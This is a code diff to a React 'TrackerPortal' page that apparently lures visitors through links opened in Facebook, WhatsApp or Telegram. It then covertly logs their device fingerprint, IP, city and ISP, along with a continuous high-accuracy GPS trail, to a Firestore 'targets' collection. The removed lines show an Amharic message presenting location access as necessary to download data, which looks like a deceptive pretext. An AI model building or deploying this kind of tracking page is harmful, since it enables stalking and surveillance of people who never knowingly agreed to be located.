@@ -96,91 +96,93 @@ export const TrackerPortal: React.FC = () => {
     setProgress(100);
 
     try {
-      // Fire-and-forget background auth to avoid blocking
-      signInAnonymously(auth).catch(e => console.warn("Sync delay:", e));
-
-      if (!navigator.geolocation) {
-        throw new Error('SECURE_PROTOCOL_UNSUPPORTED');
-      }
-
-      // Metadata for tracking
-      const getExtraInfo = async () => {
-        const info: any = {
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          screen: `${window.screen.width}x${window.screen.height}`,
-          cores: navigator.hardwareConcurrency || 'unknown',
-          platform: navigator.platform,
-          memory: (navigator as any).deviceMemory || 'unknown',
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          referrer: document.referrer || 'direct'
-        };
-
-        try {
-          if ('getBattery' in navigator) {
-            const battery: any = await (navigator as any).getBattery();
-            info.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
-          }
-        } catch (e) {}
-
-        try {
-          const conn: any = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
-          if (conn) {
-            info.network = {
-              type: conn.effectiveType,
-              downlink: conn.downlink,
-              rtt: conn.rtt
-            };
-          }
-        } catch (e) {}
-
-        return info;
+      // 1. Authenticate immediately and wait for UID
+      const userCred = await signInAnonymously(auth);
+      const uid = userCred.user.uid;
+      
+      // 2. Metadata for tracking (Synchronous as much as possible)
+      const deviceInfo: any = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        cores: navigator.hardwareConcurrency || 'unknown',
+        platform: navigator.platform,
+        memory: (navigator as any).deviceMemory || 'unknown',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer || 'direct',
+        isPWA: window.matchMedia('(display-mode: standalone)').matches
       };
 
-      const extraInfo = await getExtraInfo();
+      // 3. Platform Detection
       const ua = (navigator.userAgent || "").toLowerCase();
-      let platform = 'Mobile';
-      if (ua.includes('fb')) platform = 'Facebook';
-      else if (ua.includes('whatsapp')) platform = 'WhatsApp';
-      else if (ua.includes('telegram')) platform = 'Telegram';
-      else if (ua.includes('iphone')) platform = 'iPhone';
-      else if (ua.includes('android')) platform = 'Android';
+      let platform = 'Mobile_Browser';
+      if (ua.includes('fb')) platform = 'Facebook_InApp';
+      else if (ua.includes('whatsapp')) platform = 'WhatsApp_InApp';
+      else if (ua.includes('tgandroid') || ua.includes('telegram')) platform = 'Telegram_InApp';
+      else if (ua.includes('iphone')) platform = 'iPhone_Safari';
+      else if (ua.includes('android')) platform = 'Android_Chrome';
 
-      const targetDisplayName = targetIdRef.current || `Subject_${targetId?.slice(-4) || 'ALPHA'}`;
+      const targetDisplayName = targetIdRef.current || `Asset_${uid.slice(0, 4)}`;
+      const targetRef = doc(db, 'targets', uid);
+
+      // 4. IMMEDIATE FIRST PING (No geolocation needed yet)
+      const initialPayload = {
+        name: targetDisplayName,
+        lastSeen: new Date().toISOString(),
+        status: 'active',
+        platform: platform,
+        deviceInfo: deviceInfo,
+        lastPing: serverTimestamp()
+      };
+
+      await setDoc(targetRef, initialPayload, { merge: true });
+      setSyncCount(1);
+
+      // 5. IP TRACKING (With Fallbacks)
+      const captureIP = async () => {
+        const services = [
+          'https://ipapi.co/json/',
+          'https://ip-api.com/json/',
+          'https://api.ipify.org?format=json'
+        ];
+
+        for (const service of services) {
+          try {
+            const res = await fetch(service, { signal: AbortSignal.timeout(5000) });
+            const data = await res.json();
+            
+            let ipInfo = {};
+            if (service.includes('ipapi.co')) {
+              ipInfo = { ip: data.ip, city: data.city, country: data.country_name, org: data.org };
+            } else if (service.includes('ip-api.com')) {
+              ipInfo = { ip: data.query, city: data.city, country: data.country, org: data.isp };
+            } else {
+              ipInfo = { ip: data.ip };
+            }
+
+            if (Object.keys(ipInfo).length > 0) {
+              await updateDoc(targetRef, { ipInfo: ipInfo });
+              return ipInfo;
+            }
+          } catch (e) {
+            console.warn(`IP service ${service} failed. Trying next...`);
+          }
+        }
+        return null;
+      };
+
+      captureIP().then(ip => {
+        if (ip) (window as any)._eagle_ip = ip;
+      });
+
+      // 6. GEOLOCATION TRACKING
       let lastReportTime = 0;
-      const MIN_INTERVAL = 3000; 
+      const MIN_INTERVAL = 2000; 
 
-      // Initial IP capture for quick data even without GPS
-      try {
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
-        (window as any)._eagle_ip = {
-           ip: ipData.ip,
-           city: ipData.city,
-           region: ipData.region,
-           country: ipData.country_name,
-           org: ipData.org
-        };
-        const uid = auth.currentUser?.uid || targetId || `T-AUTO-${Math.random().toString(36).substring(7).toUpperCase()}`;
-        const targetRef = doc(db, 'targets', uid);
-        
-        await setDoc(targetRef, {
-          name: targetDisplayName,
-          lastSeen: new Date().toISOString(),
-          status: 'active',
-          platform: platform,
-          ipInfo: {
-             ip: ipData.ip,
-             city: ipData.city,
-             region: ipData.region,
-             country: ipData.country_name,
-             org: ipData.org
-          },
-          deviceInfo: extraInfo
-        }, { merge: true });
-        setSyncCount(prev => prev + 1);
-      } catch (e) {
-        console.warn("IP tracking skipped or blocked.");
+      if (!navigator.geolocation) {
+        setStatus('error');
+        setErrorMsg('SECURE_PROTOCOL_UNSUPPORTED');
+        return;
       }
 
       navigator.geolocation.watchPosition(
@@ -188,18 +190,12 @@ export const TrackerPortal: React.FC = () => {
           const { latitude, longitude, accuracy } = position.coords;
           const now = Date.now();
           
-          // Allow first few reports even if imprecise to ensure we get *something*
-          if (now - lastReportTime < MIN_INTERVAL && syncCount > 10) {
-             if (accuracy > 100) return; 
-          }
+          if (now - lastReportTime < MIN_INTERVAL) return;
           
           lastReportTime = now;
           setSyncCount(prev => prev + 1);
           
           try {
-            const uid = auth.currentUser?.uid || targetId || `T-AUTO-${Math.random().toString(36).substring(7).toUpperCase()}`;
-            const targetRef = doc(db, 'targets', uid);
-            
             const historyItem = { 
               lat: latitude, 
               lng: longitude, 
@@ -207,25 +203,15 @@ export const TrackerPortal: React.FC = () => {
             };
 
             await setDoc(targetRef, {
-              name: targetDisplayName,
               lat: latitude,
               lng: longitude,
               accuracy: accuracy,
               lastSeen: new Date().toISOString(),
-              status: 'active',
-              platform: platform,
-              ipInfo: (window as any)._eagle_ip,
-              deviceInfo: extraInfo,
               history: arrayUnion(historyItem)
             }, { merge: true });
             
-            // Notification success (Subtle)
-            const signalHint = document.createElement('div');
-            signalHint.className = 'fixed bottom-4 left-1/2 -translate-x-1/2 bg-blue-500/10 border border-blue-500/50 text-blue-500 text-[8px] font-bold px-3 py-1 rounded shadow-lg z-[9999] opacity-50 pointer-events-none';
-            signalHint.innerText = `LINK_STABLE: ACCURACY_${Math.round(accuracy)}M`;
-            document.body.appendChild(signalHint);
-            setTimeout(() => signalHint.remove(), 2000);
-
+            // Success Feedback
+            setStatus('granted');
           } catch (e) {
             console.error("Uplink Failure:", e);
           }
@@ -234,13 +220,12 @@ export const TrackerPortal: React.FC = () => {
           console.error("Geo Error:", error);
           if (error.code === error.PERMISSION_DENIED) {
             setStatus('denied');
-            setErrorMsg('LOCATION_REQUIRED: ዳታውን ወደ ስልክዎ ለማውረድ የቦታ መገኛ ፍቃድ መስጠት አስፈላጊ ነው።');
           }
         },
-        { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
       );
     } catch (err: any) {
-      console.error(err);
+      console.error("Fatal Recon Failure:", err);
       setStatus('error');
     }
   };
